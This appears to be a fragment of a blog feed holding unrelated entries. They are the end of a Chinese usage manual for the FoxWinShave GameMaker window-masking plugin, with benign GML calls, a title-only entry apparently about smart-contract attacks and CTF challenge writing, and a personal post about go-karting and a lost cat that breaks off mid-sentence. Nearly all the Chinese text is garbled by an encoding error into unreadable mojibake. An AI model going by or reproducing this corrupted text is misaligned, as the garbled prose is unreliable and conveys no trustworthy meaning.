<ol><li>åœ¨ GameMaker: Marketplace ä¸Šè´­ä¹°æœ¬æ’ä»¶ã€‚<a rel="noreferrer noopener" aria-label="ï¼ˆåœ¨æ–°çª—å£æ‰“å¼€ï¼‰" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">ï¼ˆç‚¹æ­¤è´­ä¹°ï¼‰</a></li><li>åœ¨ GMS ä¸­èœå•æ é€‰æ‹© Marketplace -&gt; MyLibraryï¼Œæ‰¾åˆ° FoxWinShaveï¼Œç‚¹å‡» Downloadã€‚</li><li>ä¸‹è½½å®Œæˆåï¼Œç‚¹å‡» Importã€‚</li><li>åœ¨å¼¹å‡ºçš„ Import resources: FoxWinShave å¯¹è¯æ¡†ä¸­ï¼Œé€‰ä¸­ Scripts å’Œ Included Filesï¼Œç„¶åç‚¹å‡»ä¸­é—´çš„ Add æŒ‰é’®ä»¥å¯¼å…¥æ’ä»¶è¿è¡Œæ‰€å¿…é¡»çš„æ–‡ä»¶å’Œè„šæœ¬ã€‚</li><li>å¦‚éœ€åŒæ—¶å¯¼å…¥ Demo ä»£ç åŠç´ æï¼Œé‚£å°±ç›´æ¥ç‚¹å‡»ä¸­é—´çš„ Add All æŒ‰é’®ã€‚</li><li>ç‚¹å‡»å·¦ä¸‹è§’ Import æŒ‰é’®å®Œæˆæ’ä»¶çš„å¯¼å…¥ã€‚</li></ol>



<hr class="wp-block-separator"/>



<h2>2. æ’ä»¶å…¥é—¨ 101</h2>



<h3>2.0 åŸºç¡€å‡†å¤‡</h3>



<p>è¯·åŠ¡å¿…åœ¨æ¸¸æˆè®¾ç½®ä¸­å°†çª—å£è®¾ç½®ä¸ºæ— è¾¹æ¡†ï¼ˆborderless windowï¼‰:</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="240" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 è®¾ç½®æ— è¾¹æ¡†</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="237" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 è®¾ç½®æ— è¾¹æ¡†</figcaption></figure></div>



<p>ç¨åå°†ä¼šè§£é‡Šéœ€è¦è®¾ç½®ä¸ºæ— è¾¹æ¡†çš„åŸå› ã€‚</p>



<h3>2.1 æ’ä»¶åˆå§‹åŒ–</h3>



<p>ä½¿ç”¨æœ¬æ’ä»¶çš„ä»»ä½•è„šæœ¬å‰éœ€è¦å…ˆè¿›è¡Œæ’ä»¶çš„åˆå§‹åŒ–ã€‚å»ºè®®åœ¨é¦–ä¸ª Room çš„ Creation Code å†…æˆ–è€…æŸä¸ªæ§åˆ¶ç”¨çš„ Object çš„ Game Start äº‹ä»¶é‡Œæ‰§è¡Œï¼š</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_Init();
</pre></div>


<p>æ’ä»¶åˆå§‹åŒ–åè¯·å‹¿å†æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚</p>



<h3>2.2 æ’ä»¶é‡Šæ”¾</h3>



<p>å½“ä¸å†éœ€è¦æ›´æ”¹çª—å£å½¢çŠ¶åï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‡½æ•°å°†æ’ä»¶å¸è½½ä»¥é‡Šæ”¾èµ„æºï¼š</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; highlight: [2]; title: ; notranslate">
NF_WS_ResetWindow(); // é‡ç½®çª—å£å½¢çŠ¶ä¸ºé»˜è®¤ï¼Œéå¿…è¦
NF_WS_Free(); // é‡Šæ”¾æ’ä»¶
</pre></div>


<p>åœ¨é‡Šæ”¾æ’ä»¶åå¦‚æœéœ€è¦å†æ¬¡ä½¿ç”¨æœ¬æ’ä»¶ï¼Œéœ€è¦é‡æ–°è¿›è¡Œæ’ä»¶çš„åˆå§‹åŒ–ã€‚</p>



<h3>2.3 åŸºç¡€åŸç†è§£é‡Š</h3>



<h4>2.3.0 çª—å£åæ ‡ç³»</h4>



<p>å°†æ¸¸æˆçª—å£æƒ³è±¡æˆä¸€ä¸ªç”»å¸ƒï¼ŒæŒ‰ç…§çª—å£çš„è¾¹æ¡†å¼€å§‹ç®—å·¦ä¸Šè§’åæ ‡ä¸º (0, 0)ï¼Œå³ä¸‹è§’è¾¹æ¡†æœ€å¤–å¤„åæ ‡ä¸º (viewport_width + å·¦è¾¹æ¡†å®½ + å³è¾¹æ¡†å®½, viewport_height + ä¸Šè¾¹æ¡†é«˜ + ä¸‹è¾¹æ¡†é«˜)ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="574" height="447" src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>çª—å£åæ ‡ç³»ç»Ÿ </figcaption></figure></div>



<p>ç„¶è€Œé—®é¢˜åœ¨äºçª—å£çš„è¾¹æ¡†å®½åº¦æ˜¯ç”± Windows ç³»ç»Ÿå®šä¹‰çš„ï¼Œä¸åŒ Windows ç‰ˆæœ¬æˆ–è€…ä¸åŒçš„ä¸»é¢˜éƒ½æœ‰å¯èƒ½å¸¦æœ‰ä¸åŒå°ºå¯¸çš„è¾¹æ¡†ï¼Œç»™åœ¨å®šä¹‰çª—å£çš„å½¢çŠ¶æ—¶è®¡ç®—åæ ‡å¸¦æ¥äº†éº»çƒ¦ã€‚å› æ­¤å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè¯·<strong>åŠ¡å¿…</strong>åœ¨æ¸¸æˆå…¨å±€è®¾ç½®ä¸­å…³é—­çª—å£è¾¹æ¡†çš„æ˜¾ç¤ºï¼Œè¿™æ ·çª—å£çš„åæ ‡ç³»ç»Ÿå°±å’Œæ¸¸æˆ View Port çš„åæ ‡ç³»ç»Ÿçš„åŸç‚¹èƒ½å¤Ÿç»Ÿä¸€ï¼Œä¾¿äºå°†çª—å£å½¢çŠ¶ä¸æ¸¸æˆç»˜åˆ¶å†…å®¹å¯¹é½ã€‚</p>



<p>ä¸‹æ–‡åœ¨æè¿°åæ ‡æ—¶å°†é»˜è®¤ä½¿ç”¨æ— è¾¹æ¡†çª—å£ã€‚</p>



<h4>2.3.1 æ¸¸æˆç»˜åˆ¶ä¸ View Port</h4>



<p>GM æ”¯æŒåœ¨ä¸€ä¸ªçª—å£ä¸­åŒæ—¶æ˜¾ç¤ºå¤šä¸ª View Portã€‚View Port çš„ä½œç”¨æ˜¯å°† Room çš„ä¸€éƒ¨åˆ†å†…å®¹æŒ‰ä¸€å®šæ¯”ä¾‹ã€ç¼©æ”¾å’Œä½ç§»æ˜ å°„åœ¨çª—å£ä¸­æ˜¾ç¤ºå‡ºæ¥ã€‚ç”¨æˆ·å®é™…çœ‹åˆ°çš„å†…å®¹æ˜¯ç»è¿‡ View Port å˜æ¢åçš„ç»“æœï¼Œå¹¶ä¸ï¼ˆä¸€å®šï¼‰æ˜¯æ¸¸æˆä¸­è°ƒç”¨ç»˜åˆ¶ä»£ç æ—¶ä½¿ç”¨çš„åæ ‡ã€‚</p>



<p>ç”±äºæˆ‘ä»¬åªå…³å¿ƒç”¨æˆ·å®é™…çœ‹åˆ°äº†ä»€ä¹ˆï¼Œå› æ­¤ä¸‹æ–‡ä¸­æåˆ°çš„<strong>â€œæ¸¸æˆç»˜åˆ¶å†…å®¹â€</strong>çš„å°ºå¯¸ã€åæ ‡ï¼Œçš†ä¸ºç»è¿‡ View Port å˜æ¢åæ˜ å°„åˆ°çª—å£åæ ‡ç³»ä¸­çš„å°ºå¯¸å’Œåæ ‡ã€‚</p>



<p>æ›´å¤šå…³äº View Port çš„å†…å®¹ï¼Œè¯·å‚è€ƒ GM å®˜æ–¹æ–‡æ¡£ï¼Œä¸‹æ–‡å°†ä¸å†èµ˜è¿°ã€‚</p>



<h4>2.3.2 çª—å£å½¢çŠ¶é®ç½©</h4>



<p>æœ¬æ’ä»¶é‡‡ç”¨é®ç½©å½¢å¼è®¾ç½®çª—å£å½¢çŠ¶ï¼Œæ”¯æŒæ ¹æ® Sprite å’Œ Surfaceï¼ˆä»…é™ GMSï¼‰è®¾ç½®çª—å£é®ç½©ã€‚ä»¥ä¸‹æ ¸å¿ƒå‡½æ•°</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ä»…é™ GMS
</pre></div>


<p>ä¸ draw_sprite_* ç³»åˆ—ç»˜åˆ¶å‡½æ•°æœ‰ç€ååˆ†ç±»ä¼¼çš„å½¢å¼ï¼Œé™¤äº†ä¸æ”¯æŒ rot å’Œ  <br>colourå‚æ•°ï¼ŒåŒæ—¶ alpha å‚æ•°æœ‰ä¸åŒçš„æ„ä¹‰ã€‚å¯ä»¥ç†è§£ä¸ºå°†ç»™å®šçš„ Sprite / Surface ç”¨æä¾›çš„å‚æ•°æ”¾ç½®äºçª—å£åæ ‡ç³»å†…ä½œä¸ºé®ç½©ï¼ˆä¸ç»è¿‡ View Port ç­‰ä»»ä½•å˜æ¢ï¼‰ï¼ŒåŒæ—¶å°†çª—å£æ²¡æœ‰è¢«é®ç½©è¦†ç›–çš„åŒºåŸŸç»™â€œæ¶ˆå»â€å˜ä¸ºé€æ˜ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>â€œé®ç½©å±‚â€å†…å®¹</figcaption></figure></div>



<p>å¦‚å›¾æ‰€ç¤ºï¼Œçº¢è‰²éƒ¨åˆ†çš„çª—å£ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œå…¶ä½™éƒ¨åˆ†å°†ä¼šè¢«æ¶ˆå»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸Šå›¾æ‰€è°“çš„â€œé®ç½©å±‚â€æ˜¯ä¸€ä¸ªä¸çª—å£åŒæ ·å¤§å°çš„ä½äºçª—å£ä¹‹ä¸Šçš„æƒ³è±¡å‡ºçš„ä¸€å±‚ï¼Œå¹¶ä¸æ˜¯å®é™…å­˜åœ¨çš„å¯è§å›¾å±‚ï¼Œå…¶å†…å®¹ä»…ä¸ºäº†ä½œä¸ºé®ç½©æ‰€ç”¨ï¼Œå¹¶ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p>



<p>é®ç½©å±‚ä½¿ç”¨çš„å›¾åƒä¸ºå½©è‰²å›¾åƒå¸¦ Alpha é€šé“ã€‚åœ¨å®é™…è¿è¡Œæ—¶è‰²å½©é€šé“ä¼šè¢«å®Œå…¨å¿½ç•¥ï¼Œæœ€ç»ˆçª—å£å½¢çŠ¶ä»…å—é®ç½©å±‚çš„ Alpha é€šé“å½±å“ã€‚é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ª Alpha é€šé“å€¼ä¸º 0 çš„åƒç´ ï¼ˆå³çº¯é€æ˜åƒç´ ï¼‰è¢«è®¤ä¸ºæ˜¯çª—å£éœ€è¦è¢«æ¶ˆå»çš„éƒ¨åˆ†ã€‚è¿™ä¸ªå€¼å¯ä»¥é€šè¿‡ä¸Šæ–‡æ‰€è¿°çš„å‡ ä¸ªå‡½æ•°ä¸­çš„ alpha å‚æ•°ï¼ˆèŒƒå›´ [0, 1.0]ï¼‰æ¥æ”¹å˜ã€‚ä»»ä½• Alpha é€šé“å€¼ &lt;= è¯¥å‚æ•°çš„åƒç´ å°†è¢«è®¤ä¸ºæ˜¯éœ€è¦æ¶ˆå»çš„ã€‚æ³¨æ„ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ ä¼ å…¥çš„ alpha å‚æ•°ä¸º 1ï¼Œåˆ™<strong>ä»»ä½•</strong>åƒç´ éƒ½ä¼šè¢«è®¤å®šä¸ºé€æ˜åƒç´ ã€‚</p>



<p>å¦å¤–ï¼Œå¦‚æœä½¿ç”¨ Surface æ¥ä¼ å…¥é®ç½©å†…å®¹ï¼Œè¯·æ³¨æ„ Surface çš„èƒŒæ™¯éœ€è¦ç”¨é€æ˜è‰²å¡«å……ï¼š</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; highlight: [2]; title: ; notranslate">
surface_set_target(mask_surface);
draw_clear_alpha(c_white, 0); // Alpha = 0, ä½¿ç”¨çš„é¢œè‰²æ— æ‰€è°“.
</pre></div>


<h4>2.3.3 é®ç½©å¯¹é½</h4>



<p>ä½¿ç”¨æœ¬æ’ä»¶çš„ç›®çš„é€šå¸¸æ˜¯æƒ³å°†æ¸¸æˆçª—å£çš„å½¢çŠ¶ï¼Œè£å‰ªæˆæ¸¸æˆç»˜åˆ¶çš„æœ‰æ„ä¹‰çš„å†…å®¹çš„å½¢çŠ¶ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>æ¸¸æˆå®é™…ç»˜åˆ¶å†…å®¹</figcaption></figure></div>



<p>ä¸Šå›¾ä¸­ï¼Œå¥³ç‰›ä»”çš„éƒ¨åˆ†æ˜¯æœ‰æ„ä¹‰çš„ã€éœ€è¦ä¿ç•™çš„éƒ¨åˆ†ï¼Œè€Œé»‘è‰²èƒŒæ™¯éœ€è¦è¢«è£å‰ªæ‰ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬åœ¨é®ç½©å±‚â€œç»˜åˆ¶â€çš„é®ç½©éœ€è¦ä¸å¥³ç‰›ä»”çš„ä½ç½®ã€å½¢çŠ¶ç›¸åŒã€‚</p>



<p>è¿™ä¹ä¸€å¬ä¼¼ä¹å¾ˆå®¹æ˜“ï¼Œåªè¦ä½¿ç”¨ç›¸åŒçš„ xï¼Œy å‚æ•°å°†åŒæ ·çš„å¥³ç‰›ä»” Sprite ç»˜åˆ¶åˆ° Application Surface å’Œé®ç½©å±‚å³å¯ã€‚ä½†æ˜¯æ­£å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œç”¨æˆ·å®é™…çœ‹åˆ°çš„å†…å®¹æ˜¯ç»è¿‡ View Port å˜æ¢è¿‡çš„ï¼Œå› æ­¤å…¶å®é™…æ˜¾ç¤ºçš„åæ ‡å’Œå°ºå¯¸å¯èƒ½ä¸ç»˜åˆ¶æ—¶ä¼ å…¥çš„å‚æ•°ä¸åŒï¼›ç„¶è€Œé®ç½©å±‚æ˜¯ä¸å— View Port å½±å“çš„ï¼Œå› æ­¤å¼€å‘è€…éœ€è¦è‡ªè¡Œè®¡ç®—é®ç½©å±‚å›¾åƒçš„ä½ç½®å’Œå°ºå¯¸ï¼Œç”¨ä»¥å¯¹é½ç»è¿‡ View Port å˜æ¢åçš„æ¸¸æˆå†…å®¹ã€‚å»ºè®®ä¸è¦ç”¨è¿‡äºå¤æ‚çš„ View Port è®¾ç½®ã€‚</p>



<h4>2.3.4 çª—å£å½¢çŠ¶æ›´æ–°æ—¶é—´ä¸ç»˜åˆ¶äº‹ä»¶é¡ºåº</h4>



<p>ç”±äº GM è¿è¡ŒåŸç†æ‰€è‡´ï¼Œæ¸¸æˆç»˜åˆ¶çš„å†…å®¹å¹¶ä¸ä¼šåœ¨ç»˜åˆ¶è¯­å¥æ‰§è¡Œçš„ç¬é—´æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œæ˜¯è¦ç­‰åˆ°å½“å‰ Step æ‰€æœ‰ç»˜åˆ¶å®Œæˆåæ‰ä¼šåˆ·æ–°ç»˜åˆ¶ç¼“å­˜ä»¥æ˜¾ç¤ºç»˜åˆ¶çš„å†…å®¹ã€‚è¿™æ„å‘³ç€çª—å£å¤–å½¢çš„æ›´æ–°éœ€è¦ä¸ç»˜åˆ¶å†…å®¹çš„åˆ·æ–°åŒæ­¥å‘ç”Ÿï¼Œå¦åˆ™å°±ä¼šå‘ç”Ÿçª—å£å½¢çŠ¶ä¸æ‰€æ˜¾ç¤ºå†…å®¹æœ‰æ‰€åå·®çš„é—®é¢˜ï¼ˆæ¯”å¦‚æ¸¸æˆä»ç„¶æ˜¾ç¤ºçš„æ˜¯ä¸Šä¸€å¸§çš„å†…å®¹ï¼Œä½†æ˜¯çª—å£å½¢çŠ¶å·²ç»è¢«è£å‰ªæˆäº†ä¸‹ä¸€å¸§æ‰€éœ€çš„å½¢çŠ¶ï¼‰ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="286" height="262" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>ç»˜åˆ¶å†…å®¹ä¸çª—å£å½¢çŠ¶æ²¡æœ‰åŒæ­¥æ›´æ–° </figcaption></figure></div>



<p>ç”±äº Windows çª—å£å¤–å½¢æ›´æ–°æ—¶æœºæ‰€é™ï¼Œæœ¬æ’ä»¶éœ€è¦åœ¨ GM çš„æ¯ä¸ª Step ä¸­ï¼Œäºæ¯ä¸ª Step å¼€å§‹ ï¼ˆBegin Stepï¼‰è‡³ Draw ç³»åˆ—äº‹ä»¶å¼€å§‹ä¹‹å‰å¯¹çª—å£å½¢çŠ¶è¿›è¡Œæ›´æ–°ï¼Œä»¥ä¿è¯çª—å£å½¢çŠ¶çš„æ›´æ–°ä¸ç»˜åˆ¶å†…å®¹çš„æ›´æ–°èƒ½å¤ŸåŒæ­¥å®Œæˆã€‚å¦‚æœåœ¨ Draw ç³»åˆ—äº‹ä»¶ä¸­è¿›è¡Œçª—å£å½¢çŠ¶çš„ä¿®æ”¹ï¼Œåˆ™ä¼šå‘ç”Ÿçª—å£å½¢çŠ¶ä¸ç»˜åˆ¶å†…å®¹ä¸åŒæ­¥çš„é—®é¢˜ï¼Œè¯·åŠ¡å¿…æ³¨æ„ã€‚å»ºè®®åœ¨ End Step äº‹ä»¶ä¹‹ä¸­æ›´æ–°çª—å£å½¢çŠ¶ã€‚</p>



<p>å†æ¬¡æç¤ºï¼Œè¯·<strong>ä¸è¦</strong>åœ¨ Draw <strong>ç³»åˆ—</strong>äº‹ä»¶ä¸­æ›´æ–°çª—å£å½¢çŠ¶ï¼é™¤éä½ ååˆ†æ¸…æ¥šå¯èƒ½å‘ç”Ÿçš„åæœï¼</p>



<h3>2.4 å¤æ‚é®ç½©</h3>



<p>å¤šæ¬¡æ‰§è¡Œä»¥ä¸‹ä»»æ„æ ¸å¿ƒå‡½æ•°æ¥æ”¹å˜çª—å£å½¢çŠ¶ï¼Œåˆ™åä¸€æ¬¡çš„é®ç½©å°†ä¼šè¦†ç›–å‰ä¸€æ¬¡çš„é®ç½©ï¼Œ<strong>å¹¶ä¸ä¼š</strong>äº’ç›¸å åŠ ï¼š</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ä»…é™ GMS
</pre></div>


<p>è¿™æ„å‘³ç€å¦‚æœæ‰€éœ€çš„é®ç½©æ˜¯ç”±å¤šä¸ªå…ƒç´ ç»„åˆè€Œæˆçš„å¤æ‚å½¢çŠ¶ï¼Œåˆ™éœ€è¦å¼€å‘è€…è‡ªè¡Œå‡†å¤‡å¥½å·²ç»äº‹å…ˆç»„åˆå¥½æ‰€æœ‰å…ƒç´ çš„<strong>å•å¼ </strong> Sprite / Surface ç”¨ä½œå®é™…çš„é®ç½©ã€‚</p>



<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ éœ€è¦åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸¤ä½å¥³ç‰›ä»”ï¼Œé‚£ä¹ˆä½ éœ€è¦å‡†å¤‡å¦‚ä¸‹çš„<strong>ä¸€å¼ </strong> Sprite / Surface ä½œä¸ºé®ç½©ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>å¤æ‚é®ç½©</figcaption></figure></div>



<p>è¿ç»­è°ƒç”¨ä¸¤æ¬¡ NF_WS_ShaveWindow_* å‡½æ•°å¹¶ä¸èƒ½å®ç°å¦‚ä¸Šæ‰€è¿°çš„éœ€æ±‚ã€‚å‡è®¾ç¬¬ä¸€æ¬¡ä¼ å…¥äº†å·¦ä¾§ç‰›ä»”çš„é®ç½©ï¼Œç¬¬äºŒæ¬¡ä¼ å…¥äº†å³ä¾§çš„é®ç½©ï¼Œåˆ™åªæœ‰å³ä¾§ä¼šæ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œç¬¬ä¸€æ¬¡è®¾ç½®çš„é®ç½©ä¼šè¢«è¦†ç›–è€Œå¤±æ•ˆã€‚</p>



<hr class="wp-block-separator"/>



<h2>3. å¸¸è§é—®é¢˜</h2>



<ol><li>ä½¿ç”¨ Sprite åšé®ç½©æ—¶è¦æ³¨æ„æ‰€ç”¨ Sprite çš„ xoffset å’Œ yoffsetã€‚</li></ol>
<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 ä¸­æ–‡ä½¿ç”¨æ‰‹å†Œ</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[æ™ºèƒ½åˆçº¦æ”»å‡»é¢åŠctfå‡ºé¢˜æŒ‡å—]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[æ™ºèƒ½åˆçº¦æ”»å‡»é¢åŠctfå‡ºé¢˜æŒ‡å—]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[å¡ä¸è½¦ä¸çŒ«]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>æœ¬æ¥æ‰“ç®—æ‹¿çº¸åšä¸ªæ¶å­æŠŠæ‰‹æœºå›ºå®šåœ¨å¸½å­ä¸Šå…¨ç¨‹æ‹æ‘„<br>ç„¶è€Œè¿‡å¼¯åŠ›åº¦å¤ªå¤§æ‰‹æœºå·¦æ™ƒå³æ™ƒæœ€åè¿˜æ˜¯ç”©äº†å‡ºå»<br>å°±æ–‡å­—åˆ†äº«ä¸€ä¸‹ä¿Šèˆªå¡ä¸è½¦çš„ä½“éªŒå§<br>ä¸Šè½¦åå·¥ä½œäººå‘˜å‘è½¦å‘äº†å¥½å‡ æ¬¡éƒ½æ²¡å‘ç€æœ‰ç‚¹å°å°´å°¬<br>ç¬¬ä¸€è„šå¬åˆ°æ²¹é—¨é©¬è¾¾çš„è½°é¸£å£°ç«‹åˆ»æœ‰ç§é©¾é©­é‡å…½çš„æ„Ÿè§‰<br>å…ˆä¸æ€¥ç¬¬ä¸€åœˆæ¨¡ä»¿f1æš–èƒ<br>åœ¨èµ›é“ä¸Šå·¦å³æ‘‡æ‘†é²¨é±¼å·¡èˆª<br>å®¤å†…èµ›é“é•¿åº¦è¾ƒçŸ­ä½†è·¯é¢å¹³æ•´å¾—ç”šè‡³åå…‰å¾ˆé€‚åˆæ¼‚ç§»<br>è½¦èº«å¾ˆç¨³åœ°æ‘‡å®Œç¬¬ä¸€åœˆ<br>ç¬¬äºŒåœˆå¼€å¯è¿åŠ¨æ¨¡å¼<br>åŸè°…æˆ‘æ˜¯ä¸ªé”®ç›˜è½¦æ‰‹æ²¹é—¨åªä¼šè¸©åˆ°åº•<br>åŠ é€Ÿæ„Ÿè¶…å¼ºå…¥ç¬¬ä¸€ä¸ªå¼¯å‰é€Ÿåº¦ä¼°è®¡æœ‰30è¿ˆ<br>å‡é€Ÿ è´´è¾¹ çŒ›æ‰“æ–¹å‘ç›˜ æ²¹é—¨è¸©åˆ°åº• æ–¹å‘ç›˜åæ‰“<br>ç»“æœå·®ç‚¹é£˜äº†180åº¦<br>ä½†è¿˜æ˜¯ä¸å¯é¿å…çš„æ’äº†è·¯è¾¹è½®èƒ<br>ç†Ÿæ‚‰æ‰‹æ„Ÿåå°±æ”¾å¼€äº†<br>è™½ç„¶åœ°æ–¹å°ä½†å¼¯é“çš„å¸ƒç½®å¾ˆåˆç†<br>æ¼‚ç§»æ—¶skrskrskr~å¾ˆåˆºæ¿€~<br>åŠªåŠ›å……åˆ†åˆ©ç”¨èµ›é“æ„Ÿè§‰è‡ªå·±èµ°çº¿è¿˜å¯ä»¥~<br>æˆ‘ä¸ºè½¦ç‹‚ï¼ï¼ï¼</p><hr><p>ä¸€å¹´å‰çš„12æœˆï¼Œå¤§å¯æœ‰äººä»ç«é”…åº—è€æ¿é‚£é‡Œæ”¶äº†åªå¹¼çŒ«ï¼Œä»æ­¤å¼€å§‹äº†æœ‰çŒ«é™ªä¼´çš„æ—¥å­ã€‚<br>å¦‚ä»ŠçŒ«å’ªå·²ç»ä¸åœ¨ï¼Œè´´ç‚¹ç…§ç‰‡å’Œè§†é¢‘è¡¨è¾¾ä¸€ä¸‹å¯¹å®ƒçš„æƒ³å¿µã€‚</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>è¿™å¼ 